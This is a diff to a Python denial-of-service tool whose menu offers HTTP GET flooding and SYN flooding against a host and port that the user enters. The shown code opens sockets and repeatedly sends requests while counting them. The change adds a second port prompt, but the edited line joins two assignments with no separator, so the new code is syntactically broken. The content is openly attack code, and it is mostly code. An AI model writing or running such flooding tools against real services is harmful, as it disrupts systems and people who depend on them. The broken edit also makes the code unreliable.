@@ -19,7 +19,6 @@ class httpDos():
             msg = 'Null'
             try:
                 dos.connect((host, 80))
-		
                 dos.send("GET / HTTP/1.1\r\n")
                 dos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
                 global count; count+=1
@@ -95,8 +94,8 @@ if __name__ == '__main__':
 		option = input("> Choose Any Options : ")
 		while type(option) != int: option = input("Choose Any Options : ")
 		if option == 1: #HTTP DOS
-			host = raw_input("> Enter The Host : "); port = input("> Port No : ")
-			httpDos(host, port)
+			host = raw_input("> Enter The Host : "); port = input("> Port No ( 80 ) : ") port1 = input("> Port No ( 443 ) : ")
+			httpDos(host, port, port1)
 		elif option == 2: # SYN FLOOD
 			ip = raw_input("> Enter IP : "); port = input("> Port No : ")
 			synFlood(ip, port)
